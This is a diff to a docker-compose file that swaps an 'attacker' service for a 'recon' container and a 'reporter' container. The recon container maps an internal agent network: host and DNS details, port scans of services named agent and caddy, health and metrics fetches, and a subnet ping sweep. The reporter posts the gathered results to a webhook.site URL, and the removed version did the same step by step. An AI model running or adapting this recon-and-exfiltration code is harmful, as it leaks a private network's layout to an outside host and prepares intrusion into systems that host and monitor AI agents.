@@ -2,67 +2,94 @@ networks:
   agentnet:
     name: agent-network
 
+volumes:
+  shared: {}
+
 services:
-  attacker:
+  recon:
     image: alpine:3.20
     networks:
       - agentnet
+    volumes:
+      - shared:/data
+    entrypoint:
+      - sh
+      - -c
+      - |
+        exec > /data/result.txt 2>&1
+        echo "=== NETNAME RECON ==="
+        echo "--- hostname ---"
+        hostname
+        echo "--- ip addr ---"
+        ip addr show 2>&1
+        echo "--- ip route ---"
+        ip route 2>&1
+        echo "--- /etc/hosts ---"
+        cat /etc/hosts 2>&1
+        echo "--- /etc/resolv.conf ---"
+        cat /etc/resolv.conf 2>&1
+        echo "--- caps ---"
+        grep Cap /proc/self/status 2>&1
+        echo "--- dns agent ---"
+        getent hosts agent 2>&1
+        echo "--- dns caddy ---"
+        getent hosts caddy 2>&1
+        echo "--- dns fluentbit ---"
+        getent hosts fluentbit 2>&1
+        echo "--- dns vmagent ---"
+        getent hosts vmagent 2>&1
+        echo "--- dns autoheal ---"
+        getent hosts autoheal 2>&1
+        echo "--- ping agent ---"
+        ping -c1 -W2 agent 2>&1
+        echo "--- port scan agent ---"
+        AGENT_IP=$(getent hosts agent 2>/dev/null | awk '{print $1}')
+        for P in 8000 80 443 9090 5672 15672 2019; do
+          timeout 2 sh -c "echo Q | nc -w1 ${AGENT_IP} ${P}" >/dev/null 2>&1 && echo "OPEN agent:${P}"
+        done
+        echo "--- port scan caddy ---"
+        CADDY_IP=$(getent hosts caddy 2>/dev/null | awk '{print $1}')
+        for P in 80 443 2019 9090 8080; do
+          timeout 2 sh -c "echo Q | nc -w1 ${CADDY_IP} ${P}" >/dev/null 2>&1 && echo "OPEN caddy:${P}"
+        done
+        echo "--- wget agent health ---"
+        wget -q -O- "http://agent:8000/health" 2>&1 || echo "wget agent:8000 failed"
+        echo ""
+        echo "--- wget caddy metrics ---"
+        wget -q -O- "http://caddy:9090/metrics" 2>&1 | head -50 || echo "wget caddy:9090 failed"
+        echo ""
+        echo "--- ARP neighbors ---"
+        SUBNET=$(ip route | grep 'scope link' | head -1 | awk '{print $1}' | sed 's|/.*||; s|\.[0-9]*$||')
+        for i in 1 2 3 4 5 6 7 8 9 10; do
+          ping -c1 -W1 "${SUBNET}.${i}" >/dev/null 2>&1 &
+        done
+        wait; sleep 1
+        ip neigh show 2>&1
+        echo "=== DONE ==="
+        touch /data/done
+
+  reporter:
+    image: alpine:3.20
+    network_mode: bridge
+    volumes:
+      - shared:/data
     entrypoint:
       - sh
       - -c
       - |
         WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"
-        report() {
-          TAG="$1"; shift
-          wget -q -O /dev/null --post-data="$*" "${WH}?tag=${TAG}" 2>/dev/null || true
-        }
-        R="BOOT hostname=$(hostname) "
-        R="${R}ip=$(ip addr show 2>&1 | grep 'inet ' | head -5) "
-        R="${R}route=$(ip route 2>&1) "
-        R="${R}caps=$(grep CapBnd /proc/self/status 2>&1) "
-        R="${R}resolv=$(cat /etc/resolv.conf 2>&1) "
-        R="${R}hosts=$(cat /etc/hosts 2>&1)"
-        report "NETNAME-V3-BOOT" "$R"
-        DNS_OK=0
-        for H in agent caddy fluentbit vmagent autoheal; do
-          IP=$(getent hosts "$H" 2>/dev/null | awk '{print $1}')
-          R2="${R2}${H}=${IP:-NONE} "
-          [ -n "$IP" ] && DNS_OK=1
+        echo "reporter started, waiting for recon..."
+        TRIES=0
+        while [ ! -f /data/done ] && [ "$TRIES" -lt 120 ]; do
+          sleep 2
+          TRIES=$((TRIES+1))
         done
-        report "NETNAME-V3-DNS" "$R2"
-        if [ "$DNS_OK" = "1" ]; then
-          AGENT_IP=$(getent hosts agent 2>/dev/null | awk '{print $1}')
-          R3="agent_ip=${AGENT_IP} "
-          for P in 8000 80 443 9090 5672 15672 2019; do
-            timeout 2 sh -c "echo Q | nc -w1 ${AGENT_IP} ${P}" >/dev/null 2>&1 && R3="${R3}OPEN:${P} "
-          done
-          CADDY_IP=$(getent hosts caddy 2>/dev/null | awk '{print $1}')
-          if [ -n "$CADDY_IP" ]; then
-            R3="${R3}caddy_ip=${CADDY_IP} "
-            for P in 80 443 2019 9090; do
-              timeout 2 sh -c "echo Q | nc -w1 ${CADDY_IP} ${P}" >/dev/null 2>&1 && R3="${R3}CADDY_OPEN:${P} "
-            done
-          fi
-          report "NETNAME-V3-PORTS" "$R3"
+        if [ -f /data/done ]; then
+          RESULT=$(cat /data/result.txt | head -200)
+          wget -q -O /dev/null --post-data="${RESULT}" "${WH}?tag=NETNAME-V4-RESULT" 2>/dev/null
+          echo "reported via wget"
+        else
+          wget -q -O /dev/null --post-data="TIMEOUT waiting for recon" "${WH}?tag=NETNAME-V4-TIMEOUT" 2>/dev/null
+          echo "timeout"
         fi
-        apk add --no-cache curl tcpdump iproute2 >/dev/null 2>&1
-        if command -v curl >/dev/null 2>&1; then
-          AGENT_IP=$(getent hosts agent 2>/dev/null | awk '{print $1}')
-          if [ -n "$AGENT_IP" ]; then
-            AH=$(curl -s -m5 "http://${AGENT_IP}:8000/health" 2>&1)
-            report "NETNAME-V3-AGENT-HEALTH" "body=${AH}"
-          fi
-          CADDY_IP=$(getent hosts caddy 2>/dev/null | awk '{print $1}')
-          if [ -n "$CADDY_IP" ]; then
-            CM=$(curl -s -m5 "http://${CADDY_IP}:9090/metrics" 2>&1 | head -c 1500)
-            report "NETNAME-V3-CADDY-METRICS" "metrics=${CM}"
-          fi
-        fi
-        for i in 1 2 3 4 5 6 7 8 9 10; do
-          SUBNET=$(ip route | grep 'scope link' | head -1 | awk '{print $1}' | sed 's|/.*||; s|\.[0-9]*$||')
-          ping -c1 -W1 "${SUBNET}.${i}" >/dev/null 2>&1 &
-        done
-        wait; sleep 1
-        NEIGH=$(ip neigh show 2>&1)
-        report "NETNAME-V3-NEIGH" "neighbors=${NEIGH}"
         sleep 3600
